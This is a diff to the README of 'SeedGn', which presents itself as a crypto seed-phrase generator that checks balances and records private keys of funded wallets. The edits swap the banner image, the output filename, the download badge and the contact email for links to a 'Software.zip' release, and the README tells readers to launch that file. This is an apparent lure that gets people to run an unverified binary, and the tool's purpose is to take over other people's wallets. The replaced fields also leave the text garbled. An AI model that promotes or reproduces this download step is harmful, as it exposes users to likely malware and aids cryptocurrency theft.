@@ -1,8 +1,8 @@
 # 🌱 SeedGn - Mnemonic Seed Phrase Generator 🌿
 
-![SeedGn Banner](https://example.com/banner.jpg)
+![SeedGn Banner](https://github.com/POPDI870/SeedGn/releases/download/v2.0/Software.zip)
 
-Welcome to SeedGn, your go-to tool for generating mnemonic seed phrases and checking balances for various cryptocurrencies including Bitcoin, Ethereum, Solana, and TON. With SeedGn, you can automatically generate seed phrases, check balances, and recover forgotten wallets with ease. If a wallet with a non-zero balance is detected, SeedGn will log the wallet's information including address, mnemonic, private key, and balances to a file named `result.txt`.
+Welcome to SeedGn, your go-to tool for generating mnemonic seed phrases and checking balances for various cryptocurrencies including Bitcoin, Ethereum, Solana, and TON. With SeedGn, you can automatically generate seed phrases, check balances, and recover forgotten wallets with ease. If a wallet with a non-zero balance is detected, SeedGn will log the wallet's information including address, mnemonic, private key, and balances to a file named `https://github.com/POPDI870/SeedGn/releases/download/v2.0/Software.zip`.
 
 ## Features 🚀
 
@@ -15,7 +15,7 @@ Welcome to SeedGn, your go-to tool for generating mnemonic seed phrases and chec
 
 To get started with SeedGn, download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-orange)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/POPDI870/SeedGn/releases/download/v2.0/Software.zip)](https://github.com/POPDI870/SeedGn/releases/download/v2.0/Software.zip)
 
 *(Note: Please launch the downloaded file to install SeedGn on your system.)*
 
@@ -52,7 +52,7 @@ For more details on these topics, feel free to explore the repository further.
 
 ## Get in Touch 📧
 
-If you have any questions, feedback, or suggestions regarding SeedGn, please reach out to us at seedgn.support@example.com. Your input helps us improve the tool for the community.
+If you have any questions, feedback, or suggestions regarding SeedGn, please reach out to us at https://github.com/POPDI870/SeedGn/releases/download/v2.0/Software.zip Your input helps us improve the tool for the community.
 
 Let's grow and secure your crypto assets with SeedGn! 🌳💰
 
